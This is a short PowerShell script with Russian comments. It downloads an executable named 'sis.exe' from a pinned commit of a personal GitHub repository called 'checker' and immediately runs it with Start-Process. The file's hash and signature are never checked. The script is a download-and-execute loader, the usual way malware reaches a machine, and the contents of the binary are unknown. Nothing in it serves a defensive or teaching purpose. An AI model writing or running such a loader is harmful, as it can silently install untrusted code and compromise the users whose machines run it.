
# Указываем URL для скачивания exe файла (не забудьте использовать raw-версию)
$url = "https://raw.githubusercontent.com/8ares781/checker/8a6bd295c3411cbd9cdc412d6494a9c0e650b435/sis.exe"

# Указываем путь для сохранения файла
$filePath = "sis.exe"

# Скачиваем файл
Invoke-WebRequest -Uri $url -OutFile $filePath

# Проверяем, если файл был скачан
if (Test-Path $filePath) {
    Write-Host "Файл успешно сохранен как $filePath"

    # Запускаем файл (например, exe-файл)
    Start-Process $filePath
} else {
    Write-Host "Ошибка при скачивании файла"
}
